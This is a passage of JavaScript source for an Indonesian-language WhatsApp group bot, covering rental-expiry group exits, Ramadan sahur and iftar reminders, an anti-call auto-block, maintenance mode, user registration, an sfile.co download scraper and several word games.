                                text: `🛑 *Masa Sewa Bot Telah Habis*\n\nTerima kasih telah menggunakan bot @VannessWangsaff.\nBot akan keluar otomatis dalam 5 detik.\n\nKalau mau sewa lagi, hubungi owner ya!`,
                                mentions: [botNumber] // mention bot biar keliatan
                            });

                            // Tunggu 5 detik biar pesan terkirim
                            await new Promise(resolve => setTimeout(resolve, 15000));

                            await sock.groupLeave(s.groupId);
                            s.status = 'expired';
                            changed = true;

                        } catch (err) {
                            console.log(`Gagal keluar dari ${s.groupId}:`, err.message);
                            if (err.message?.includes('not-a-member') || err.data === 403) {
                                s.status = 'expired';
                                changed = true;
                            }
                        }
                    }
                }

                if (changed) {
                    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
                }
            } catch (err) {
                console.error('Error checkExpiredSewa:', err);
            }
        }

        // Jalankan pengecekan setiap 5 menit
        setInterval(() => {
            if (sock) checkExpiredSewa(sock);
        }, 5 * 60 * 1000);




        const imsakFile = "./data/imsakiyah.json";


        // List thumbnail & audio
        const thumbnails = [
            "https://files.catbox.moe/4lusdd.jpg",
            "https://files.catbox.moe/rf5ywb.jpg"

        ];

        const audioSahur = "https://files.catbox.moe/c8m23w.mp3";
        const audioBuka = "https://files.catbox.moe/8206w0.mp3";

        // Fungsi kirim pengingat
        async function kirimPengingat(teks, isSahur = false) {
            if (!fsSync.existsSync(imsakFile)) return;

            let config;
            try {
                config = JSON.parse(fsSync.readFileSync(imsakFile, 'utf8'));
            } catch (e) {
                console.error("[IMSAK READ CONFIG ERROR]", e.message);
                return;
            }


            if (!config || !Array.isArray(config.grups) || config.grups.length === 0) {
                console.log("[IMSAK] Tidak ada grup aktif atau config invalid");
                return;
            }

            const kotaId = config.kotaDefault || "1301";
            let kotaNama = config.kotaNama || "Pekanbaru";

            try {
                const jadwal = await getTodaySchedule(kotaId);
                const times = extractPrayerTimes(jadwal);

                const thumbn = thumbnails[Math.floor(Math.random() * thumbnails.length)];
                const audioUrl = isSahur ? audioSahur : audioBuka;

                for (const grup of config.grups) {
                    try {
                        let msg = teks.replace('{kota}', kotaNama);
                        if (isSahur) {
                            msg += `\n\nWaktu imsak: *${times.imsak || 'N/A'} WIB*\nSegera sahur ya! Jangan sampai ketinggalan.\nSemoga puasanya lancar dan diterima Allah ~ 🤲🍲`;
                        } else {
                            msg += `\n\nWaktu buka puasa: *${times.maghrib || 'N/A'} WIB*\nSelamat berbuka!\nSemoga amal ibadah kita diterima Allah SWT.\n\n#RamadanMubarak 🌙🍽️`;
                        }

                        const sendMsg = await sock.sendMessage(grup, {
                            text: msg,
                            contextInfo: {
                                externalAdReply: {
                                    title: isSahur ? "Pengingat Sahur" : "Waktu Buka Puasa",
                                    body: `Lokasi: ${kotaNama} • ${moment().tz("Asia/Jakarta").format("DD MMM YYYY")}`,
                                    thumbnailUrl: thumbn,
                                    sourceUrl: "https://wa.me/",
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        });

                        // Kirim audio
                        await sock.sendMessage(grup, {
                            audio: { url: audioUrl },
                            mimetype: 'audio/mpeg',
                            ptt: true
                        }, { quoted: sendMsg });

                    } catch (e) {
                        console.log(`Gagal kirim ke ${grup}:`, e.message);
                    }
                }
            } catch (err) {
                console.error("[IMSAK KIRIM ERROR]", err.message);
            }
        }

        // Reset jadwal setiap hari jam 00:01 WIB
        cron.schedule('1 0 * * *', async () => {
            console.log("[CRON IMSAK] Reset jadwal hari ini...");
            await scheduleTodayImsakiyah();
        }, { timezone: "Asia/Jakarta" });

        // Fungsi jadwalkan pengingat hari ini
        async function scheduleTodayImsakiyah() {
            if (!fsSync.existsSync(imsakFile)) {
                console.log("[IMSAK] File config belum ada:", imsakFile);
                return;
            }

            let config;
            try {
                config = JSON.parse(fsSync.readFileSync(imsakFile, 'utf8'));
            } catch (e) {
                console.error("[IMSAK PARSE ERROR]", e.message);
                return;
            }


            if (!config || typeof config !== 'object' || !Array.isArray(config.grups)) {
                console.log("[IMSAK] Config invalid atau grups bukan array");
                return;
            }

            if (config.grups.length === 0) {
                console.log("[IMSAK] Tidak ada grup aktif");
                return;
            }

            const kotaId = config.kotaDefault || "1301";

            try {
                const jadwal = await getTodaySchedule(kotaId);
                const times = extractPrayerTimes(jadwal);

                const sekarang = moment().tz("Asia/Jakarta");

                // Sahur
                if (times.imsak && times.imsak !== "-") {
                    const [jam, menit] = times.imsak.split(':').map(Number);
                    const waktuImsak = moment.tz({ hour: jam, minute: menit }, "Asia/Jakarta");
                    const waktuKirim = waktuImsak.clone().subtract(10, 'minutes');

                    const delay = waktuKirim.diff(sekarang);
                    if (delay > 0) {
                        setTimeout(() => kirimPengingat("🌙 *PENGINGAT SAHUR HARI INI*", true), delay);

                    } else {

                    }
                }

                // Buka puasa
                if (times.maghrib && times.maghrib !== "-") {
                    const [jam, menit] = times.maghrib.split(':').map(Number);
                    const waktuMaghrib = moment.tz({ hour: jam, minute: menit }, "Asia/Jakarta");

                    const delay = waktuMaghrib.diff(sekarang);
                    if (delay > 0) {
                        setTimeout(() => kirimPengingat("🌅 *WAKTU BUKA PUASA TELAH TIBA!*", false), delay);

                    } else {

                    }
                }

            } catch (err) {
                console.error("[SCHEDULE IMSAK ERROR]", err.message);
            }
        }

        // Jalankan pertama kali setelah bot start 
        setTimeout(scheduleTodayImsakiyah, 15000);

        // Cek ulang setiap jam 
        setInterval(scheduleTodayImsakiyah, 60 * 60 * 1000);


        if (!global.anticallListenerInitialized) {
            global.anticallListenerInitialized = true;

            sock.ev.on('call', async (callEvents) => {
                if (!global.anticall.active) return;

                console.log('📞 [ANTI-CALL PERMANEN] Panggilan masuk:', JSON.stringify(callEvents, null, 2));

                const processed = new Set();

                for (const call of callEvents) {
                    if (call.status !== 'offer' || processed.has(call.from)) continue;

                    processed.add(call.from);

                    // Kecualikan nomor owner 
                    if (global.anticall.excludedNumbers.includes(call.from)) {
                        console.log(`⏩ Panggilan dari owner/excluded dilewati: ${call.from}`);
                        continue;
                    }

                    try {
                        // Kirim pesan peringatan ke penelepon
                        await sock.sendMessage(call.from, {
                            text: global.anticall.warningMessage,
                            mentions: [call.from],
                        });
                        console.log(`✉️ Pesan anti-call permanen dikirim ke ${call.from}`);

                        // Tolak panggilan
                        await sock.rejectCall(call.id, call.from);
                        console.log(`📞 Panggilan dari ${call.from} ditolak`);

                        // Blokir nomor
                        await sock.updateBlockStatus(call.from, 'block');
                        console.log(`🚫 ${call.from} berhasil diblokir permanen`);

                        // Kirim notif ke owner 
                        if (global.anticall.notifyOwner) {
                            const waktu = moment().tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss WIB");
                            const callerNumber = call.from.split('@')[0]; // nomor tanpa @s.whatsapp.net
                            const notifText = `⚠️ *PANGGILAN MASUK DITERIMA!*\n\n` +
                                `Dari: wa.me/${callerNumber}\n` +
                                `Waktu: ${waktu} WIB\n` +
                                `Status: Ditolak & diblokir permanen otomatis\n\n` +
                                `Nomor penelepon: wa.me/${callerNumber}`;

                            await sock.sendMessage(global.anticall.ownerJid, { text: notifText });
                            console.log(`📩 Notif anti-call dikirim ke owner untuk penelepon ${callerNumber}`);
                        }

                    } catch (e) {

                    }

                    // Delay antar proses
                    await new Promise(r => setTimeout(r, 2000));
                }
            });


        }

        const maintenanceFile = './data/maintenance.json';

        let maintenanceMode = false;
        let maintenanceReason = "Bot sedang dalam perawatan rutin. Mohon bersabar ya! 🚧";

        // Thumbnail maintenance 
        const maintenanceThumb = "https://gofile.io/d/8WZYyZ";

        function loadMaintenance() {
            if (fsSync.existsSync(maintenanceFile)) {
                try {
                    const data = JSON.parse(fsSync.readFileSync(maintenanceFile, 'utf8'));
                    maintenanceMode = data.enabled || false;
                    maintenanceReason = data.reason || "Bot sedang dalam perawatan.";
                    return;
                } catch (e) {
                    console.error("Gagal load maintenance.json:", e);
                }
            }
            // Default
            maintenanceMode = false;
            maintenanceReason = "Bot sedang dalam perawatan rutin. Mohon bersabar ya! 🚧";
        }

        function saveMaintenance() {
            try {
                fsSync.writeFileSync(maintenanceFile, JSON.stringify({
                    enabled: maintenanceMode,
                    reason: maintenanceReason
                }, null, 2));
            } catch (e) {
                console.error("Gagal save maintenance.json:", e);
            }
        }

        // Load saat bot mulai
        loadMaintenance();



        if (isCmd && maintenanceMode && !isAn) {
            const maintenanceText =
                `🚧 *MODE MAINTENANCE AKTIF*\n\n` +
                `${maintenanceReason}\n\n` +
                `Bot sementara ditutup untuk semua pengguna kecuali owner.\n` +
                `Silakan hubungi owner jika ada keperluan mendesak.`;

            await sock.sendMessage(m.chat, {
                text: maintenanceText,
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: false,
                        title: "MODE MAINTENANCE",
                        body: "Bot sedang dalam perawatan • @VannessWangsaff",
                        thumbnailUrl: maintenanceThumb,
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        sourceUrl: "https://wa.me/628999991950"
                    }
                }
            }, { quoted: m });

            return;  // Hentikan eksekusi command lain
        }


        const groupDataDir = './data/totalpesan/';

        if (!fsSync.existsSync(groupDataDir)) {
            fsSync.mkdirSync(groupDataDir, { recursive: true });
        }

        function getGroupData(chatId) {
            const file = `${groupDataDir}${chatId.replace(/[^0-9]/g, '')}.json`;
            if (fsSync.existsSync(file)) {
                try {
                    return JSON.parse(fsSync.readFileSync(file, 'utf8'));
                } catch (e) {
                    console.error(`Gagal load group data ${chatId}:`, e);
                }
            }
            return {};
        }

        function saveGroupData(chatId, data) {
            const file = `${groupDataDir}${chatId.replace(/[^0-9]/g, '')}.json`;
            try {
                fsSync.writeFileSync(file, JSON.stringify(data, null, 2));
            } catch (e) {
                console.error(`Gagal save group data ${chatId}:`, e);
            }
        }


        if (m.isGroup && !m.key.fromMe && m.sender && m.message) {
            const groupData = getGroupData(m.chat);
            if (!groupData.chatStats) groupData.chatStats = {};

            const sender = m.sender;
            if (!groupData.chatStats[sender]) {
                groupData.chatStats[sender] = { count: 0, lastChat: 0 };
            }

            groupData.chatStats[sender].count++;
            groupData.chatStats[sender].lastChat = Date.now();

            saveGroupData(m.chat, groupData);
        }


        const allowedWithoutReg = [
            'daftar', 'register', 'reg',
            'ceksn', 'cekserial', 'mysn',

            'menu', 'allmenu', 'tourl',
            'owner', 'tt', 'intro',
            'sc', 'script'
        ];

        if (isCmd &&
            !allowedWithoutReg.includes(command) &&
            !checkRegisteredUser(m.sender) &&
            !isAn) {  // Owner tetap bisa tanpa registrasi

            return await sock.sendMessage(m.chat, {
                text: `*[AKSES DITOLAK]*\n\n` +
                    `Kamu belum terdaftar di bot ini.\n` +
                    `Semua fitur hanya bisa digunakan setelah registrasi.\n` +
                    `Ketik:\n` +
                    `→ *${prefix}daftar nama|umur|gender*\n` +
                    `Contoh:\n` +
                    `${prefix}daftar Vanness|17|laki-laki`,
                contextInfo: {
                    externalAdReply: {
                        title: "REGISTRASI DIBUTUHKAN",
                        body: "Daftar dulu untuk membuka semua fitur",
                        thumbnailUrl: "https://files.catbox.moe/4w7p17.jpg",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        sourceUrl: "https://vannessstore.id"
                    }
                }
            }, { quoted: m });
        }


        /***
        
        Sfile Download & Search
        
        ***/


        const sfile = {
            createHeaders: (referer) => ({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="137", "Google Chrome";v="137"',
                dnt: '1',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                Referer: referer,
                Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }),

            extractCookies: (headers) => {
                const raw = headers.get('set-cookie');
                if (!raw) return '';
                return raw
                    .split(',')
                    .map((c) => c.split(';')[0])
                    .join('; ');
            },

            extractMetadata: ($) => {
                const m = {};
                m.filename = $('.overflow-hidden img').attr('alt')?.trim();
                m.mimetype = $('.divide-y span').first().text().trim();
                m.upload_date = $('.divide-y .font-semibold').eq(2).text().trim();
                m.download_count = $('.divide-y .font-semibold').eq(1).text().trim();
                m.author_name = $('.divide-y a').first().text().trim();
                return m;
            },

            makeRequest: async (u, o = {}) => {
                const res = await fetch(u, o);
                return res;
            },

            search: async (query, page = 1) => {
                const res = await fetch(`https://sfile.co/search.php?q=${query}&page=${page}`);
                const $ = cheerio.load(await res.text());
                const result = [];

                $('.group.px-2').each((_, el) => {
                    const title = $(el).find('.min-w-0 a').text().trim();
                    const link = $(el).find('a').attr('href');
                    const elm = $(el).find('.mt-1').text().split('•');

                    if (link)
                        result.push({
                            title,
                            size: elm[0]?.trim(),
                            upload_at: elm[1]?.trim(),
                            link,
                        });
                });

                return result;
            },

            download: async (url, resultBuffer = false) => {
                try {
                    let h = sfile.createHeaders(url);

                    const init = await sfile.makeRequest(url, {
                        headers: h,
                    });

                    if (!init.ok) throw new Error(`Init request gagal (${init.status})`);

                    const htmlInit = await init.text();

                    const ck = sfile.extractCookies(init.headers);
                    if (ck) h.Cookie = ck;

                    let $ = cheerio.load(htmlInit);
                    const meta = sfile.extractMetadata($);

                    const dl = $('#download').attr('data-dw-url');
                    if (!dl) throw new Error('Download URL gak ketemu');

                    h.Referer = dl;

                    const proc = await sfile.makeRequest(dl, {
                        headers: h,
                    });

                    if (!proc.ok) throw new Error(`Process request gagal (${proc.status})`);

                    const htmlProc = await proc.text();
                    $ = cheerio.load(htmlProc);

                    const scr = $('script')
                        .map((i, el) => $(el).html())
                        .get()
                        .join('\n');

                    const re = /https:\\\/\\\/download\d+\.sfile\.co\\\/downloadfile\\\/\d+\\\/\d+\\\/[a-z0-9]+\\\/[^\s'"]+\.[a-z0-9]+(\?[^"']+)?/gi;
                    const mt = scr.match(re);

                    if (!mt?.length) throw new Error('Link download final gak ketemu di script');

                    const fin = mt[0].replace(/\\\//g, '/');

                    let download;

                    if (resultBuffer) {
                        const fileRes = await fetch(fin, { headers: h });

                        if (!fileRes.ok) throw new Error(`File download gagal (${fileRes.status})`);

                        const arrayBuffer = await fileRes.arrayBuffer();
                        download = Buffer.from(arrayBuffer);
                    } else {
                        download = fin;
                    }

                    return {
                        metadata: meta,
                        download,
                    };
                } catch (e) {
                    throw new Error(e.message);
                }
            },
        };




        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        // Menghitung total fitur 
        const getTotalFitur = () => {
            try {

                const scriptContent = fsSync.readFileSync(__filename, 'utf-8');
                const matches = scriptContent.match(/case\s+['"]([^'"]+)['"]/g);
                return matches ? matches.length : 0;
            } catch {
                return "Banyak";
            }
        };


        if (m.isGroup && !isCmd && body) {
            let resultKocok = await utKocok(sock, m, body);
            if (resultKocok) return;
        }


        if (m.isGroup && !isCmd && body) {
            global.tebaktebakan = global.tebaktebakan || {};
            let id = m.chat;

            if (id in global.tebaktebakan) {
                let json = global.tebaktebakan[id][1];
                let reward = global.tebaktebakan[id][2] || 200;
                let userAnswer = body.toLowerCase().trim();
                let correctAnswer = json.jawaban.toLowerCase().trim();


                if (userAnswer === 'bantuan' || userAnswer === 'hint') {

                    let clue = correctAnswer.replace(/[AIUEOaiueo]/g, '_');
                    sock.sendMessage(m.chat, {
                        text: `💡 *BANTUAN CLUE:*\n\nJawaban: \`${clue}\`\n\nAyo tebak lagi!`
                    }, { quoted: m });
                }

                // 2. Fitur Nyerah 
                else if (userAnswer === 'nyerah' || userAnswer === 'surrend') {
                    sock.sendMessage(m.chat, {
                        text: `🏳️ *YAH KOK NYERAH...*\n\nPermainan dihentikan!\nJawaban yang benar adalah: *${correctAnswer.toUpperCase()}*`
                    }, { quoted: m });


                    clearTimeout(global.tebaktebakan[id][3]);
                    delete global.tebaktebakan[id];
                }

                // 3. Deteksi Jawaban Benar
                else if (userAnswer === correctAnswer) {

                    try {
                        if (db && typeof db.addLimit === 'function') {
                            db.addLimit(m.sender, reward);
                        }
                    } catch (e) {
                        console.log("Database update limit terlewati");
                    }

                    let teksMenang = `╭──〔 *🎉 JAWABAN BENAR!* 〕──╮\n`;
                    teksMenang += `│\n`;
                    teksMenang += `│ 👤 *Penebak* : @${m.sender.split('@')[0]}\n`;
                    teksMenang += `│ 📝 *Jawaban* : ${correctAnswer.toUpperCase()}\n`;
                    teksMenang += `│ 🎁 *Hadiah* : +${reward} Limit\n`;
                    teksMenang += `│\n`;
                    teksMenang += `╰─────────────────────╯\n`;
                    teksMenang += `> © @VannessWangsaff ID V3`;

                    sock.sendMessage(m.chat, {
                        text: teksMenang,
                        mentions: [m.sender]
                    }, { quoted: m });

                    await sock.sendMessage(m.chat, { react: { text: "🎉", key: m.key } });


                    clearTimeout(global.tebaktebakan[id][3]);
                    delete global.tebaktebakan[id];
                }
            }
        }

        const monospace = (text) => `\`\`\`${text}\`\`\``;

        global.asahotak = global.asahotak || {};

        if (m.isGroup && !isCmd && body) {
            let id = m.chat;

            if (global.asahotak[id]) {
                let { soal, jawaban, waktu } = global.asahotak[id];
                let userAnswer = body.toLowerCase().trim();

                // NYERAH
                if (userAnswer === 'nyerah') {
                    await reply(`🏳️ *MENYERAH!*\n\nJawaban: *${jawaban.toUpperCase()}*`);
                    clearTimeout(waktu);
                    delete global.asahotak[id];
                    return;
                }

                // JAWABAN BENAR
                if (userAnswer.includes(jawaban)) {
                    let reward = 5;

                    // Tambah limit
                    try {
                        if (db && typeof db.addLimit === 'function') {
                            db.addLimit(m.sender, reward);
                        }
                    } catch (e) {
                        console.log("Gagal add limit:", e);
                    }

                    let teksMenang = `╭──〔 *🎉 JAWABAN BENAR!* 〕──╮\n`;

                    teksMenang += `│ 👤 *Penjawab* : @${m.sender.split('@')[0]}\n`;
                    teksMenang += `│ 📝 *Jawaban* : ${jawaban.toUpperCase()}\n`;
                    teksMenang += `│ 🎁 *Hadiah* : +${reward} Limit\n`;

                    teksMenang += `╰─────────────────────╯\n`;
                    teksMenang += `> © @VannessWangsaff`;

                    await sock.sendMessage(m.chat, {
                        text: teksMenang,
                        mentions: [m.sender]
                    }, { quoted: m });

                    await sock.sendMessage(m.chat, {
                        react: { text: "🎉", key: m.key }
                    });

                    clearTimeout(waktu);
                    delete global.asahotak[id];
                }
            }
        }

        let isChatBanned = global.db?.data?.chats?.[m.chat]?.isBanned || false;


        if (isChatBanned && !isAn) {

            return;
        }

        // Fungsi untuk mengekstrak suku kata terakhir sebagai filter
        function skataFilter(text) {
            let mati = ["q", "w", "r", "t", "y", "p", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m"];
            let misah;
            if (text.length < 3) return text;
            if (/([qwrtypsdfghjklzxcvbnm][qwrtypsdfhjklzxcvbnm])$/.test(text)) {
                return /([qwrtypsdfhjklzxcvbnm])$/.exec(text)[0];
            }
            if (/([qwrtypsdfghjklzxcvbnm][aiueo]ng)$/.test(text)) {
                return /([qwrtypsdfghjklzxcvbnm][aiueo]ng)$/.exec(text)[0];
            } else if (/([aiueo][aiueo]([qwrtypsdfghjklzxcvbnm]|ng)?)$/i.test(text)) {
                if (/(ng)$/i.test(text)) return text.substring(text.length - 3);
                else if (/([qwrtypsdfghjklzxcvbnm])$/i.test(text)) return text.substring(text.length - 2);
                else return text.substring(text.length - 1);
            } else if (/n[gy]([aiueo]([qwrtypsdfghjklzxcvbnm])?)$/.test(text)) {
                let nyenye = /n[gy]/i.exec(text)[0];
                misah = text.split(nyenye);
                return nyenye + misah[misah.length - 1];
            } else {
                let res = Array.from(text).filter(v => mati.includes(v));
                let resu = res[res.length - 1];
                for (let huruf of mati) {
                    if (text.endsWith(huruf)) {
                        resu = res[res.length - 2];
                    }
                }
                misah = text.split(resu);
                if (text.endsWith(resu)) {
                    return resu + misah[misah.length - 2] + resu;
                }
                return resu + misah[misah.length - 1];
            }
        }

        // Fungsi generate kata awal
        async function genKata() {
            let json = await sKata();
            let result = json.kata;
            while (result.length < 3 || result.length > 7) {
                json = await sKata();
                result = json.kata;
            }
            return result;
        }

        // --- INTERCEPTOR SAMBUNG KATA ---
        if (skataSessions[m.chat] && skataSessions[m.chat].status === 'play') {
            let room = skataSessions[m.chat];

            // Cek jika pemain menyerah
            if (m.text && m.text.toLowerCase() === 'nyerah' && room.curr === m.sender) {
                clearTimeout(room.waktu);
                let index = room.player.indexOf(room.curr);
                room.player.splice(index, 1);

                if (room.player.length === 1) {
                    let winner = room.player[0];

                    if (global.db?.data?.users?.[winner]) {
                        global.db.data.users[winner].limit += 10;
                    }
                    sock.sendMessage(m.chat, { text: `🏳️ @${m.sender.split('@')[0]} menyerah!\n\n🏆 *Game Selesai!*\n@${winner.split('@')[0]} Menang dan mendapatkan *+10 Limit*!`, mentions: [m.sender, winner] });
                    delete skataSessions[m.chat];
                    return; // Hentikan eksekusi kode di bawah
                }

                if (index >= room.player.length) room.curr = room.player[0];
                else room.curr = room.player[index];

                let msg = await sock.sendMessage(m.chat, { text: `🏳️ @${m.sender.split('@')[0]} menyerah dan tereliminasi!\n\nGiliran @${room.curr.split('@')[0]}\n*${skataFilter(room.kata).toUpperCase()}... ?*\n*Reply pesan ini untuk menjawab!*\n\nSisa Pemain: ${room.player.length}`, mentions: [m.sender, room.curr] });
                room.chatId = msg.key.id;

                // Timeout untuk pemain berikutnya
                const timeoutFunc = async () => { /* Logika timeout ada di bawah */ };
                room.waktu = setTimeout(timeoutFunc, 45000);
                return;
            }

            // Deteksi jawaban yang me-reply pesan dari bot
            if (m.quoted && m.quoted.id === room.chatId && !m.fromMe) {
                if (room.curr !== m.sender) {
                    if (room.player.includes(m.sender)) return reply(`⏳ Sabar, bukan giliranmu!`);
                    return reply(`⚠️ Kamu tidak ikut bermain di sesi ini.`);
                }

                let answerF = m.text.toLowerCase().split(' ')[0].trim().replace(/[^a-z]/gi, '');
                let checkF = await cKata(answerF);
                let filterAwal = skataFilter(room.kata);

                if (!answerF.startsWith(filterAwal)) {
                    return reply(`👎🏻 *Salah!*\nJawaban harus dimulai dari suku kata *${filterAwal}*`);
                } else if (!checkF.status) {
                    return reply(`👎🏻 *Salah!*\nKata *${answerF.toUpperCase()}* tidak valid di KBBI!`);
                } else if (filterAwal === answerF) {
                    return reply(`👎🏻 *Salah!*\nJawabanmu sama dengan soal, silakan cari kata lain!`);
                } else if (room.basi.includes(answerF)) {
                    return reply(`👎🏻 *Salah!*\nKata *${answerF.toUpperCase()}* sudah pernah digunakan!`);
                }

                // --- Jawaban Benar ---
                clearTimeout(room.waktu);

                // Hadiah 2 Limit untuk jawaban benar (dengan safe check)
                if (global.db?.data?.users) {
                    global.db.data.users[m.sender] = global.db.data.users[m.sender] || { limit: 0 };
                    global.db.data.users[m.sender].limit += 2;
                }

                room.basi.push(answerF);
                room.kata = answerF;

                let index = room.player.indexOf(room.curr);
                let nextIndex = (index + 1) % room.player.length;
                room.curr = room.player[nextIndex];

                let newFilter = skataFilter(answerF);
                let textMsg = `👍 *Benar!* (+2 Limit)\n\nGiliran @${room.curr.split('@')[0]}\nMulai: *${answerF.toUpperCase()}*\n*${newFilter.toUpperCase()}... ?*\n\n*Reply pesan ini untuk menjawab!*\nKetik "nyerah" untuk menyerah.`;

                let msg = await sock.sendMessage(m.chat, { text: textMsg, mentions: [room.curr] }, { quoted: m });
                room.chatId = msg.key.id;

                // Fungsi jika pemain kehabisan waktu
                const timeoutFunc = async () => {
                    let elimIndex = room.player.indexOf(room.curr);
                    let eliminated = room.player.splice(elimIndex, 1)[0];

                    if (room.player.length === 1) {
                        let winner = room.player[0];
                        if (global.db?.data?.users) {
                            global.db.data.users[winner] = global.db.data.users[winner] || { limit: 0 };
                            global.db.data.users[winner].limit += 10;
                        }
                        sock.sendMessage(m.chat, { text: `⏰ Waktu habis!\n@${eliminated.split('@')[0]} tereliminasi.\n\n🏆 *Game Selesai!*\n@${winner.split('@')[0]} Bertahan dan Menang!\nHadiah: *+10 Limit*`, mentions: [eliminated, winner] });
                        delete skataSessions[m.chat];
                    } else {
                        if (elimIndex >= room.player.length) room.curr = room.player[0];
                        else room.curr = room.player[elimIndex];

                        let nextMsg = await sock.sendMessage(m.chat, { text: `⏰ Waktu habis!\n@${eliminated.split('@')[0]} tereliminasi.\n\nGiliran @${room.curr.split('@')[0]}\n*${newFilter.toUpperCase()}... ?*\n\n*Reply pesan ini untuk menjawab!*`, mentions: [eliminated, room.curr] });
                        room.chatId = nextMsg.key.id;
                        room.waktu = setTimeout(timeoutFunc, 45000);
                    }
                };

                room.waktu = setTimeout(timeoutFunc, 45000);
                return; // Hentikan agar command lain tidak jalan
            }
        }


        const getPremiumButtons = (currentMenu) => {
            const allRows = [
                { title: "🏠 𝖬𝖺𝗂𝗇 𝖣𝖺𝗌𝗁𝖻𝗈𝖺𝗋𝖽", description: "Kembali ke dashboard utama", id: `${prefix}menu` },
                { title: "🛡️ 𝖬𝗈𝖽𝖾𝗋𝖺𝗍𝗂𝗈𝗇 & 𝖦𝗋𝗈𝗎𝗉", description: "Fitur administrasi dan moderasi grup", id: `${prefix}groupmenu` },
                { title: "📥 𝖲𝗈𝖼𝗂𝖺𝗅 𝖣𝗈𝗐𝗇𝗅𝗈𝖺𝖽𝖾𝗋", description: "Unduh video/audio dari media sosial", id: `${prefix}downloadmenu` },
                { title: "⚙️ 𝖳𝗈𝗈𝗅𝗌 & 𝖴𝗍𝗂𝗅𝗂𝗍𝗂𝖾𝗌", description: "Fitur utilitas, konverter, dan media", id: `${prefix}toolsmenu` },
                { title: "🎮 𝖨𝗇𝗍𝖾𝗋𝖺𝖼𝗍𝗂𝗏𝖾 𝖦𝖺𝗆𝖾𝗌", description: "Fitur hiburan, mini game, dan keseruan", id: `${prefix}randommenu` },
                { title: "📌 𝖦𝖾𝗇𝖾𝗋𝖺𝗅 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇", description: "Fitur umum, ping, info bot, dll.", id: `${prefix}othermenu` },
                { title: "⚡ 𝖧𝗈𝗌𝗍 𝖯𝖺𝗇𝖾𝗅 𝖵𝟣", description: "Kelola panel server Pterodactyl V1", id: `${prefix}cpanelmenu` },
                { title: "🌌 𝖧𝗈𝗌𝗍 𝖯𝖺𝗇𝖾𝗅 𝖵𝟚", description: "Kelola panel server Pterodactyl V2", id: `${prefix}cpanelmenuv2` },
                { title: "🔑 𝖮𝗐𝗇𝖾𝗋 𝖢𝖾𝗇𝗍𝖾𝗋", description: "Perintah khusus owner & developer", id: `${prefix}ownermenu` },
                { title: "📁 𝖥𝗂𝗅𝖾 𝖲𝖤𝖳𝖳𝖨𝖭𝖦𝖲", description: "Mengelola case dan file script bot", id: `${prefix}filemenu` }
            ];

            const filteredRows = allRows.filter(row => {
                if (currentMenu === 'menu' && row.id === `${prefix}menu`) return false;
                if (currentMenu === 'ownermenu' && row.id === `${prefix}ownermenu`) return false;
                if (currentMenu === 'filemenu' && row.id === `${prefix}filemenu`) return false;
                if (currentMenu === 'cpanelmenu' && row.id === `${prefix}cpanelmenu`) return false;
                if (currentMenu === 'cpanelmenuv2' && row.id === `${prefix}cpanelmenuv2`) return false;
                if (currentMenu === 'groupmenu' && row.id === `${prefix}groupmenu`) return false;
                if (currentMenu === 'downloadmenu' && row.id === `${prefix}downloadmenu`) return false;
                if (currentMenu === 'toolsmenu' && row.id === `${prefix}toolsmenu`) return false;
                if (currentMenu === 'randommenu' && row.id === `${prefix}randommenu`) return false;
                if (currentMenu === 'othermenu' && row.id === `${prefix}othermenu`) return false;
                return true;
            });

            return [
                {
                    name: 'single_select',
                    buttonParamsJson: JSON.stringify({
                        title: "🏮 𝖤𝗑𝗉𝗅𝗈𝗋𝖾 𝖬𝖾𝗇𝗎𝗌",
                        sections: [
                            {
                                title: "🌌 𝖦𝗅𝗈𝖻𝖺𝗅 𝖲𝖾𝗋𝗏𝗂𝖼𝖾𝗌",
                                highlight_label: "✨ 𝖩𝖺𝗃𝖺𝗇-𝖡𝗈𝗍 𝖯𝗋𝖾𝗆𝗂𝗎𝗆",
                                rows: [
                                    { title: "🌐 𝖠𝗅𝗅 𝖥𝖾𝖺𝗍𝗎𝗋𝖾𝗌", description: "Tampilkan seluruh perintah bot sekaligus", id: `${prefix}allmenu` }
                                ]
                            },
                            {
                                title: "📂 𝖢𝖺𝗍𝖾𝗀𝗈𝗋𝗒 𝖲𝖾𝗅𝖾𝖼𝗍𝗂𝗈𝗇",
                                highlight_label: `🏷️ ${global.namaOwner} Edition`,
                                rows: filteredRows
                            },
                            {
                                title: "𝖡𝗈𝗍 𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇",
                                highlight_label: "ℹ️ 𝖲𝗒𝗌𝗍𝖾𝗆 𝖨𝗇𝖿𝗈",
                                rows: [
                                    { title: "🏮 𝖲𝗈𝗎𝗋𝖼𝖾 𝖢𝗈𝖽𝖾", description: "Informasi repositori script bot", id: `${prefix}sc` }
                                ]
                            }
                        ]
                    })
                },
                {
                    name: "quick_reply",
                    buttonParamsJson: JSON.stringify({ display_text: "Contact Owner 🚀", id: `${prefix}owner` })
                }
            ];
        };

        switch (command) {

            case 'menu':
            case 'start': {

                await sock.sendMessage(m.chat, { react: { text: "⏰", key: m.key } });
                await sleep(1000);


                // 1. Menyusun Teks Intro Menu
                const Sambut =
